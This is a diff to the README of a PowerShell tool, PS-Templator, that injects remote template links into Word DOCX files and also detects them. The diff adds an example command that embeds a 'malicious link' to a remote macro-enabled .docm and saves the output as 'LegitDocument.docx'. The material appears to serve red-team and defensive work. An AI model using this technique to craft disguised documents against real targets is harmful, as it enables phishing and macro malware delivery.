@@ -10,11 +10,11 @@ The following tables presents the main modules (cmdlets) of `PS-Templator.ps1`:
 
 | Cmdlet | Description | Prespective |
 | -------|:-----------:|:-----------:|
-| [Invoke-Template](#invoke-template) | Implements remote template links into default Office Word templates  | attacking |
-| [Invoke-Regular](#invoke-regular) | Implements remote template links into regular Office Word documents without template | attacking |
-| [Invoke-Identify](#invoke-identify) | Indentifies remote template links into Office Word docx documents with/without template | defensive |
+| [Invoke-Template](#invoke-template) | Implements remote template links within default Office Word templates  | attacking |
+| [Invoke-Regular](#invoke-regular) | Implements remote template links within regular Office Word documents without template | attacking |
+| [Invoke-Identify](#invoke-identify) | Indentifies remote template links within Office Word docx documents with/without template | defensive |
 
-⚠️ In this version, only DOCX files are supported.
+⚠️ `PS-Templator.ps1` supports only DOCX files.
 
 ## License
 
@@ -54,6 +54,24 @@ Import-Module .\PS-Templator.ps1
 ## cmdlets
 
 ### Invoke-Template
+
+Invoke-Template is a cmdlet that implements remote template links within default Office Word templates.
+
+#### Invoke-Template Example
+
+Assuming that you have a default Word template, like this:
+
+![Default Word Template Document](/Pictures/Default-Word-Template.png)
+
+If you use `Invoke-Template` cmdlet you can insert a malicious link within this docx
+
+```
+Invoke-Template -InputDoc Name.docx -Link "https://192.168.1.3:8080/Doc1.docm" -Output C:\Users\User\Desktop\LegitDocument.docx
+```
+
+Outcome:
+
+![Invoke-Template-1](/Pictures/Invoke-Template-1.png)
 
 ### Invoke-Regular
 
